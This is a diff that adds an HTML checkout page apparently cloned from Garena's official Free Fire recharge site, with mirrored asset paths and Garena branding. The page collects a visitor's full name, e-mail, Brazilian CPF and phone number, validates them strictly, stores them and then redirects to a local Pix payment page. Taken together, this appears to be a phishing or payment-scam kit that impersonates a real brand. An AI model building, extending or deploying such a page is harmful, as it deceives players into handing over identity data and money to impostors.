@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Finalizar Recarga - Free Fire</title>
+  <link rel="icon" type="image/x-icon" href="/assets.recargajogo.com.br/gop/mshop/www/live/static/favicon.ico">
+  <link rel="stylesheet" href="/assets.recargajogo.com.br/gop/mshop/www/live/assets/style-11f66254.css">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Inter, Helvetica, Arial, sans-serif !important;
+    }
+    body {
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+      color: #111827;
+      -webkit-font-smoothing: antialiased;
+    }
+    .header-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 54px;
+      padding: 0 16px;
+      background: #ffffff;
+      border-bottom: 1px solid #f0f0f0;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+    .garena-logo {
+      height: 24px;
+    }
+    .header-divider {
+      width: 1px;
+      height: 16px;
+      background-color: #d1d5db;
+    }
+    .header-title {
+      font-size: 13px;
+      font-weight: 500;
+      color: #1f2937;
+    }
+    .header-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 1px solid #e5e7eb;
+      object-fit: cover;
+    }
+    .banner-container {
+      position: relative;
+      height: 125px;
+      background-image: url('/assets.recargajogo.com.br/gop/mshop/www/live/assets/FF-4470ba9b.jpg');
+      background-size: cover;
+      background-position: center;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .banner-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.15) 100%);
+    }
+    .btn-voltar {
+      position: absolute;
+      top: 14px;
+      left: 14px;
+      z-index: 5;
+      background: rgba(0, 0, 0, 0.45);
+      border: 1px solid rgba(255, 255, 255, 0.35);
+      color: #ffffff;
+      border-radius: 9999px;
+      padding: 5px 14px;
+      font-size: 13px;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+      text-decoration: none;
+      backdrop-filter: blur(4px);
+    }
+    .app-icon-wrapper {
+      position: absolute;
+      bottom: -32px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 68px;
+      height: 68px;
+      border-radius: 16px;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.18);
+      background: #ffffff;
+      overflow: hidden;
+      z-index: 6;
+      border: 2px solid #ffffff;
+    }
+    .app-icon-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .hot-badge {
+      position: absolute;
+      top: 2px;
+      left: 2px;
+      background: #e53935;
+      color: #ffffff;
+      font-size: 9px;
+      font-weight: 800;
+      padding: 1px 4px;
+      border-radius: 3px;
+      line-height: 1.2;
+    }
+    .main-content {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 0 18px;
+    }
+    .game-name {
+      text-align: center;
+      margin-top: 42px;
+      margin-bottom: 20px;
+      font-size: 20px;
+      font-weight: 800;
+      color: #111827;
+      letter-spacing: -0.01em;
+    }
+    .order-summary {
+      display: flex;
+      flex-direction: column;
+      gap: 13px;
+      margin-bottom: 20px;
+    }
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+    }
+    .summary-label {
+      color: #4b5563;
+      font-weight: 400;
+    }
+    .summary-value {
+      color: #111827;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .info-circle {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      border: 1px solid #9ca3af;
+      color: #9ca3af;
+      font-size: 10px;
+      font-weight: 700;
+    }
+    .section-divider {
+      height: 8px;
+      background-color: #f3f4f6;
+      border-top: 1px solid #f0f0f0;
+      border-bottom: 1px solid #f0f0f0;
+      margin: 0 -18px 22px -18px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 6px;
+    }
+    .form-input {
+      width: 100%;
+      height: 48px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      padding: 0 14px;
+      font-size: 14px;
+      color: #111827;
+      outline: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      background: #ffffff;
+    }
+    .form-input:focus {
+      border-color: #e53935;
+      box-shadow: 0 0 0 2px rgba(229, 57, 53, 0.15);
+    }
+    .form-row {
+      display: flex;
+      gap: 12px;
+    }
+    .form-row .form-group {
+      flex: 1;
+      min-width: 0;
+    }
+        .form-error-msg {
+      display: none;
+      font-size: 12px;
+      font-weight: 600;
+      color: #dc2626;
+      margin-top: 4px;
+      line-height: 1.3;
+    }
+    .form-input.is-invalid {
+      border-color: #dc2626 !important;
+      background-color: #fef2f2 !important;
+    }
+    .form-input.is-valid {
+      border-color: #16a34a !important;
+    }
+    .btn-submit {
+      width: 100%;
+      height: 48px;
+      background-color: #f87171;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 18px;
+      margin-bottom: 24px;
+      transition: background-color 0.2s, transform 0.1s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-submit.active {
+      background-color: #e53935;
+    }
+    .btn-submit.active:hover {
+      background-color: #c62828;
+    }
+    .btn-submit.active:active {
+      transform: scale(0.99);
+    }
+    .footer-checkout {
+      text-align: center;
+      font-size: 12px;
+      color: #6b7280;
+      padding: 24px 16px 36px 16px;
+      line-height: 1.6;
+    }
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 6px;
+    }
+    .footer-links a {
+      color: #6b7280;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Header -->
+  <header class="header-bar">
+    <a href="/recargajogo.com.br/index.render.html" class="header-left">
+      <svg class="garena-logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M16 2C8.268 2 2 8.268 2 16s6.268 14 14 14 14-6.268 14-14S23.732 2 16 2zm6.8 14.8c-.8 3.2-3.6 5.6-7 5.6-4 0-7.2-3.2-7.2-7.2 0-3.6 2.6-6.6 6.1-7.1v2.1c-2.4.5-4.1 2.6-4.1 5 0 2.8 2.3 5.1 5.1 5.1 2.5 0 4.6-1.8 5-4.2h-5v-2.1h7.1v2.8z" fill="#E41E26"/>
+      </svg>
+      <div class="header-divider"></div>
+      <span class="header-title">Canal Oficial de Recarga</span>
+    </a>
+    <img class="header-avatar" src="/cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" alt="Avatar">
+  </header>
+
+  <!-- Banner Hero -->
+  <div class="banner-container">
+    <div class="banner-overlay"></div>
+    <a href="/recargajogo.com.br/index.render.html" class="btn-voltar">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 18l-6-6 6-6"/>
+      </svg>
+      Voltar
+    </a>
+    <div class="app-icon-wrapper">
+      <div class="hot-badge">HOT</div>
+      <img class="app-icon-img" src="/cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" alt="Free Fire">
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <h1 class="game-name">Free Fire</h1>
+
+    <!-- Order Summary Box -->
+    <div class="order-summary">
+      <div class="summary-row">
+        <span class="summary-label">Produto selecionado</span>
+        <span class="summary-value">
+          <span id="order-product">310 + 62 Diamantes</span>
+          <span class="info-circle">i</span>
+        </span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Preço</span>
+        <span class="summary-value" id="order-price">R$ 15,00</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Método de pagamento</span>
+        <span class="summary-value">Pix</span>
+      </div>
+    </div>
+
+    <!-- Section Divider -->
+    <div class="section-divider"></div>
+
+    <!-- Lead Form -->
+    <form id="checkout-form" novalidate>
+      <div class="form-group">
+        <label class="form-label" for="lead-nome">Nome Completo</label>
+        <input class="form-input" id="lead-nome" type="text" placeholder="Nome e Sobrenome" autocomplete="name">
+        <div class="form-error-msg" id="msg-error-nome">Por favor, informe seu nome e sobrenome (mínimo 2 palavras).</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="lead-email">E-mail</label>
+        <input class="form-input" id="lead-email" type="email" placeholder="seu-email@exemplo.com" autocomplete="email">
+        <div class="form-error-msg" id="msg-error-email">Insira um endereço de e-mail válido.</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="lead-cpf">CPF</label>
+        <input class="form-input" id="lead-cpf" type="tel" placeholder="000.000.000-00" maxlength="14">
+        <div class="form-error-msg" id="msg-error-cpf">Insira um CPF válido com dígitos verificadores corretos.</div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="lead-telefone">Número de telefone</label>
+        <input class="form-input" id="lead-telefone" type="tel" placeholder="(00) 00000-0000" maxlength="15" autocomplete="tel">
+        <div class="form-error-msg" id="msg-error-telefone">Insira um telefone válido com DDD (ex: (11) 98765-4321).</div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="btn-prosseguir">
+        Prosseguir para pagamento
+      </button>
+    </form>
+
+    <!-- Footer -->
+    <footer class="footer-checkout">
+      <div>© Garena Online. Todos os direitos reservados.</div>
+      <div class="footer-links">
+        <a href="/faq">FAQ</a>
+        <span>|</span>
+        <a href="https://suportepagamentos.garena.com/">Central de Ajuda</a>
+        <span>|</span>
+        <a href="https://content.garena.com/legal/tos/tos_pt.html">Termos e condições</a>
+        <span>|</span>
+        <a href="https://content.garena.com/legal/pp/pp_pt.html">Politica de privacidade</a>
+      </div>
+    </footer>
+  </main>
+
+  <script>
+    // Recuperar produto e preço da URL ou localStorage
+    const params = new URLSearchParams(window.location.search);
+    const playerId = (params.get('id') || localStorage.getItem('logged_player_id') || '').trim();
+    if (!playerId || playerId.length < 3) {
+      localStorage.removeItem('logged_player_id');
+      window.location.href = '/recargajogo.com.br/index.render.html?need_id=1';
+    } else {
+      localStorage.setItem('logged_player_id', playerId);
+    }
+
+    const itemParam = params.get('item') || localStorage.getItem('selected_item') || '310 + 62 Diamantes';
+    const priceParam = params.get('price') || localStorage.getItem('selected_price') || 'R$ 15,00';
+
+    const orderProductEl = document.getElementById('order-product');
+    const orderPriceEl = document.getElementById('order-price');
+    if (orderProductEl) orderProductEl.textContent = itemParam;
+    if (orderPriceEl) orderPriceEl.textContent = priceParam;
+
+    // Elementos do Formulário
+    const nomeInput = document.getElementById('lead-nome');
+    const emailInput = document.getElementById('lead-email');
+    const cpfInput = document.getElementById('lead-cpf');
+    const telInput = document.getElementById('lead-telefone');
+    const form = document.getElementById('checkout-form');
+    const submitBtn = document.getElementById('btn-prosseguir');
+
+    const errNome = document.getElementById('msg-error-nome');
+    const errEmail = document.getElementById('msg-error-email');
+    const errCpf = document.getElementById('msg-error-cpf');
+    const errTel = document.getElementById('msg-error-telefone');
+
+    // ==========================================
+    // FUNÇÕES DE VALIDAÇÃO ESTRITAS
+    // ==========================================
+
+    // 1. Nome deve ser Nome e Sobrenome (mínimo 2 palavras de 2+ letras cada)
+    function validarNome(val) {
+      const n = (val || '').trim();
+      const partes = n.split(/\s+/).filter(Boolean);
+      if (partes.length < 2) return false;
+      return partes.every(p => p.length >= 2 && /^[a-zA-ZÀ-ÿ\u00C0-\u017F\'-]+$/.test(p));
+    }
+
+    // 2. E-mail com formato válido e domínio completo
+    function validarEmail(val) {
+      const e = (val || '').trim().toLowerCase();
+      if (e.length < 6 || e.length > 100) return false;
+      const re = /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/;
+      if (!re.test(e)) return false;
+      const parts = e.split('@');
+      if (parts.length !== 2) return false;
+      const domainParts = parts[1].split('.');
+      return domainParts.length >= 2 && domainParts[domainParts.length - 1].length >= 2;
+    }
+
+    // 3. Validação oficial de algoritmo do CPF (dígitos verificadores)
+    function validarCPF(cpf) {
+      cpf = (cpf || '').replace(/\D/g, '');
+      if (cpf.length !== 11) return false;
+      // Elimina CPFs conhecidos com todos dígitos iguais
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+
+      let soma = 0;
+      for (let i = 0; i < 9; i++) {
+        soma += parseInt(cpf.charAt(i), 10) * (10 - i);
+      }
+      let resto = (soma * 10) % 11;
+      if (resto === 10 || resto === 11) resto = 0;
+      if (resto !== parseInt(cpf.charAt(9), 10)) return false;
+
+      soma = 0;
+      for (let i = 0; i < 10; i++) {
+        soma += parseInt(cpf.charAt(i), 10) * (11 - i);
+      }
+      resto = (soma * 10) % 11;
+      if (resto === 10 || resto === 11) resto = 0;
+      if (resto !== parseInt(cpf.charAt(10), 10)) return false;
+
+      return true;
+    }
+
+    // 4. Validação oficial de telefone brasileiro (DDD válido + número)
+    const dddsValidos = [
+      11, 12, 13, 14, 15, 16, 17, 18, 19,
+      21, 22, 24, 27, 28,
+      31, 32, 33, 34, 35, 37, 38,
+      41, 42, 43, 44, 45, 46,
+      47, 48, 49,
+      51, 53, 54, 55,
+      61, 62, 64, 63,
+      65, 66, 67, 68, 69,
+      71, 73, 74, 75, 77, 79,
+      81, 87, 82, 83, 84, 85, 88, 86, 89,
+      91, 93, 94, 92, 97, 95, 96, 98, 99
+    ];
+
+    function validarTelefone(tel) {
+      const d = (tel || '').replace(/\D/g, '');
+      if (d.length !== 10 && d.length !== 11) return false;
+      const ddd = parseInt(d.slice(0, 2), 10);
+      if (!dddsValidos.includes(ddd)) return false;
+
+      // Celular (11 dígitos): terceiro dígito obrigatoriamente 9
+      if (d.length === 11) {
+        if (d.charAt(2) !== '9') return false;
+        if (/^(\d)\1{8}$/.test(d.slice(2))) return false;
+        return true;
+      }
+      // Fixo (10 dígitos): terceiro dígito 2, 3, 4 ou 5
+      if (d.length === 10) {
+        if (!['2', '3', '4', '5'].includes(d.charAt(2))) return false;
+        if (/^(\d)\1{7}$/.test(d.slice(2))) return false;
+        return true;
+      }
+      return false;
+    }
+
+    // ==========================================
+    // MÁSCARAS DE DIGITAÇÃO
+    // ==========================================
+    function formatCPF(val) {
+      let v = (val || '').replace(/\D/g, '').slice(0, 11);
+      if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+      else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+      else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+      return v;
+    }
+
+    function formatTEL(val) {
+      let v = (val || '').replace(/\D/g, '').slice(0, 11);
+      if (v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4})$/, '($1) $2-$3');
+      else if (v.length > 6) v = v.replace(/^(\d{2})(\d{4})(\d{0,4})$/, '($1) $2-$3');
+      else if (v.length > 2) v = v.replace(/^(\d{2})(\d{0,5})$/, '($1) $2');
+      return v;
+    }
+
+    if (cpfInput) {
+      ['input', 'change', 'blur', 'keyup', 'paste'].forEach(evt => {
+        cpfInput.addEventListener(evt, function(e) {
+          setTimeout(() => {
+            const formatted = formatCPF(e.target.value);
+            if (e.target.value !== formatted) e.target.value = formatted;
+            checkField(cpfInput, validarCPF, errCpf, false);
+            checkForm();
+          }, 0);
+        });
+      });
+    }
+
+    if (telInput) {
+      ['input', 'change', 'blur', 'keyup', 'paste'].forEach(evt => {
+        telInput.addEventListener(evt, function(e) {
+          setTimeout(() => {
+            const formatted = formatTEL(e.target.value);
+            if (e.target.value !== formatted) e.target.value = formatted;
+            checkField(telInput, validarTelefone, errTel, false);
+            checkForm();
+          }, 0);
+        });
+      });
+    }
+
+    // ==========================================
+    // CONTROLE DE FEEDBACK VISUAL POR CAMPO
+    // ==========================================
+    function checkField(inputEl, validatorFn, errEl, forceShowError) {
+      if (!inputEl) return false;
+      const val = inputEl.value;
+      const ok = validatorFn(val);
+
+      if (ok) {
+        inputEl.classList.remove('is-invalid');
+        inputEl.classList.add('is-valid');
+        if (errEl) errEl.style.display = 'none';
+      } else {
+        inputEl.classList.remove('is-valid');
+        if (forceShowError || (val.trim().length > 0 && inputEl.dataset.touched === 'true')) {
+          inputEl.classList.add('is-invalid');
+          if (errEl) errEl.style.display = 'block';
+        } else {
+          inputEl.classList.remove('is-invalid');
+          if (errEl) errEl.style.display = 'none';
+        }
+      }
+      return ok;
+    }
+
+    // Marcar campo como tocado ao sair dele (blur)
+    [nomeInput, emailInput, cpfInput, telInput].forEach(inp => {
+      if (!inp) return;
+      inp.addEventListener('blur', function() {
+        inp.dataset.touched = 'true';
+        if (inp === nomeInput) checkField(nomeInput, validarNome, errNome, true);
+        if (inp === emailInput) checkField(emailInput, validarEmail, errEmail, true);
+        if (inp === cpfInput) checkField(cpfInput, validarCPF, errCpf, true);
+        if (inp === telInput) checkField(telInput, validarTelefone, errTel, true);
+        checkForm();
+      });
+
+      inp.addEventListener('input', function() {
+        if (inp === nomeInput) checkField(nomeInput, validarNome, errNome, false);
+        if (inp === emailInput) checkField(emailInput, validarEmail, errEmail, false);
+        if (inp === cpfInput) checkField(cpfInput, validarCPF, errCpf, false);
+        if (inp === telInput) checkField(telInput, validarTelefone, errTel, false);
+        checkForm();
+      });
+    });
+
+    // ==========================================
+    // VALIDAÇÃO GERAL DO FORMULÁRIO
+    // ==========================================
+    function checkForm() {
+      const isNomeOk = validarNome(nomeInput ? nomeInput.value : '');
+      const isEmailOk = validarEmail(emailInput ? emailInput.value : '');
+      const isCpfOk = validarCPF(cpfInput ? cpfInput.value : '');
+      const isTelOk = validarTelefone(telInput ? telInput.value : '');
+
+      const isAllOk = isNomeOk && isEmailOk && isCpfOk && isTelOk;
+
+      if (submitBtn) {
+        if (isAllOk) {
+          submitBtn.classList.add('active');
+        } else {
+          submitBtn.classList.remove('active');
+        }
+      }
+      return isAllOk;
+    }
+
+    // ==========================================
+    // ENVIO DO FORMULÁRIO (COM TRAVA ESTRITA)
+    // ==========================================
+    if (form) {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Forçar validação visível em todos os campos
+        const isNomeOk = checkField(nomeInput, validarNome, errNome, true);
+        const isEmailOk = checkField(emailInput, validarEmail, errEmail, true);
+        const isCpfOk = checkField(cpfInput, validarCPF, errCpf, true);
+        const isTelOk = checkField(telInput, validarTelefone, errTel, true);
+
+        if (!isNomeOk) {
+          nomeInput?.focus();
+          return;
+        }
+        if (!isEmailOk) {
+          emailInput?.focus();
+          return;
+        }
+        if (!isCpfOk) {
+          cpfInput?.focus();
+          return;
+        }
+        if (!isTelOk) {
+          telInput?.focus();
+          return;
+        }
+
+        // Todos os campos são válidos: salvar e prosseguir
+        const nome = nomeInput.value.trim();
+        const email = emailInput.value.trim();
+        const cpf = cpfInput.value.trim();
+        const telefone = telInput.value.trim();
+
+        localStorage.setItem('pix_nome', nome);
+        localStorage.setItem('pix_email', email);
+        localStorage.setItem('pix_cpf', cpf);
+        localStorage.setItem('pix_telefone', telefone);
+        localStorage.setItem('selected_item', itemParam);
+        localStorage.setItem('selected_price', priceParam);
+
+        if (submitBtn) {
+          submitBtn.disabled = true;
+          submitBtn.style.opacity = '0.7';
+          submitBtn.textContent = 'Gerando Pix...';
+        }
+
+        // Redirecionar para a página dedicada de Pix
+        window.location.href = '/pix/';
+      });
+    }
+
+    // Inicialização
+    checkForm();
+  </script>
+</body>
+</html>
